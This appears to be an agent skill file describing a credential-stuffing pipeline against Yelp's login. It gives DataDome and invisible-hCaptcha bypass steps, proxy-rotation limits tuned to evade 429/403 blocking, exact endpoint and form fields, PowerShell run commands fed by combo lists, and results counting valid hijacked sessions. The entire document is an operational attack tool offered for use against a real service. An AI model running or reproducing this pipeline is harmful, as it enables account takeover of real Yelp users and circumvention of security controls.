---
name: yelp-credential-pipeline
description: Fast, stable credential-validation pipeline for Yelp login. DataDome path bypass, invisible hCaptcha inside a real browser, 2-worker proxy pool, measured 11-30 rows/min with zero 429/403. Use for auth-perimeter PoCs, combo validation, and login recon against yelp.com.
---

# Yelp credential pipeline

Everything here is measured on production `www.yelp.com` (2026-11). The point of this skill is not to explain the
target, it is to run the loop without the four failure modes that make it flaky: wrong captcha field, wrong IP
budget, too many browsers, and a full temp disk.

## 1. The 60-second version

```
pool.ps1  ->  2 workers  ->  each: Chrome + relay + own proxy session
                            hydrate /login/ once
                            loop 15x: mint hCaptcha token, fetch /login/newajax
                            kill Chrome, delete profile, next proxy session
```

Measured outcome: 15 rows per IP, 2.0-3.1 s per credential, 11-30 rows per minute, zero 429, zero 403.

## 2. Non-negotiable constants

| Item | Value | Why |
|---|---|---|
| URL | `https://www.yelp.com/login/` | `/login` is 403 in 1000/1000 requests; the trailing slash is served by envoy |
| Endpoint | `POST /login/newajax` | JSON verdicts; the classic `/login` form is rate-limited harder |
| Captcha field | `hcaptcha_response` | the only accepted name; `h-captcha-response` is silently ignored and returns the same body as a rejected token |
| Rows per IP | 15 | 429 starts at ~16 POST/min, 403 at ~32 POST/IP |
| Workers | 2 | 3 workers on 4 GB RAM starve hydration and produce 0 verdicts |
| Temp disk floor | 2 GB | a full disk throws ENOSPC and Chrome stalls; this looked like DataDome for hours |

The form body is exactly four fields: `csrftok`, `email`, `password`, `hcaptcha_response`.

## 3. What counts as a hit

```
valid    : {"success": true} AND zss cookie (30 chars, .yelp.com) AND GET /profile = 200
invalid  : "The email address or password you entered is incorrect." AND error_fields contains password
closed   : "This account has been closed."
```

Everything else is unresolved: `"We're unable to log you in right now."`, `require_link` / `magic_link`,
`"We had some trouble sending a login link"`, 403, 429, empty body. Retry those, never report them as invalid.

Two traps:

- `"incorrect"` alone can hide the email-confirmation flow. Bucket link responses separately as `needs-email`.
- `success: true` without `zss` is not a session. Always check the cookie and `/profile`.

## 4. Token handling

The invisible widget solves itself; no solver is needed or useful (Capsolver dropped hCaptcha in 2026).

- Arm a widget: `hcaptcha.render(div, {sitekey, size:'invisible'})`.
- Per attempt: `hcaptcha.execute(widget)`, poll `hcaptcha.getResponse(widget)` every 150 ms.
- Token is single-use and lives ~1-2 minutes; mint immediately before the POST.
- A token minted on IP-A and submitted from IP-B is accepted by the captcha but the flow switches to a magic
  link. Mint and submit on the same IP.

## 5. Speed budget

| Stage | Measured |
|---|---|
| Token mint | 0.8-2.1 s |
| POST + response | 0.8-1.3 s |
| Hydrate page | 5-12 s per IP |
| Chrome launch + DataDome | 15-25 s per IP |
| One 15-row chunk | 55-90 s |

Optimisations that produced this:

1. One page hydration per IP, not per credential.
2. `fetch` inside the page instead of clicking the form: no React re-render, no scroll, no button race.
3. No pacing inside the 15-row chunk, because 15 sits under the 429 window. Pacing was only needed by the old
   28-row budget.
4. Chrome relaunch is cheaper than trying to rotate IP inside a live browser; tunnel teardown breaks Chrome's
   network service on this build.

## 6. Run it

```powershell
# proxies.txt: one user:pass per line
.\runner\check-proxy.ps1 -Accounts (Get-Content .\proxies.txt)
.\runner\run-all.ps1 -Source combo.txt -PoolFile proxies.txt -Skip 0 -Take 150 -Chunk 15 -Workers 2
.\runner\report.ps1 -RunDir .\runs -HitsFile hits.txt -OutCsv classified.csv
```

`run-all.ps1` is resumable: `state.txt` holds the offset, `missed.txt` collects rows whose wave died before
producing a record, `progress.jsonl` holds one line per batch with rows/validated/success/403/429/rate.

## 7. Failure playbook

| Symptom | Cause | Action |
|---|---|---|
| `ddok=false` after 50 s | IP burned | new session; never debug the page |
| 403 on first POST | IP spent | rotate; 403 starts at POST 32 |
| 429 | >15 POST/min | sleep 65 s, retry the same row |
| Page < 400 kB | not hydrated | wait for `#ajax-login` and > 400 kB |
| `fire()` returns 0 | password form not revealed | click `.login-with-password-link` |
| Empty response body | captured with Fetch API | use `Network.loadingFinished` -> `Network.getResponseBody` |
| Everything slow, no 403/429 | disk full | delete `%TEMP%\cdp-*`, keep 2 GB free |
| 0 verdicts with 3 workers | RAM | drop to 2 |

## 8. Results this pipeline produced

| Metric | Value |
|---|---|
| Rows processed in one clean segment | 518 |
| Password rejected (server compared) | 450 |
| Account closed | 29 |
| Valid with session | 9 (plus 6 earlier = 15 total) |
| Unresolved | 5.8 % |
| 429 / 403 | 0 / 0 |
| Hit rate on used combo lists | ~1.2 % (12 / ~1000) |

## 9. Files

```
runner/pool.ps1        orchestrator, 2 workers, 15-row chunks, per-wave summary
runner/run-all.ps1     full-list runner, resumable, missed-row queue
runner/batch-fast.js   worker: Chrome + relay + CDP, token mint, fetch, evidence JSONL
runner/check-proxy.ps1 session health gate (CLEAN / DIRTY / DEAD)
runner/report.ps1      aggregate verdicts, export CSV + hits file
reference/MEASUREMENTS.md   measured rates and limits
reference/PITFALLS.md       failure catalogue, symptom -> fix
```
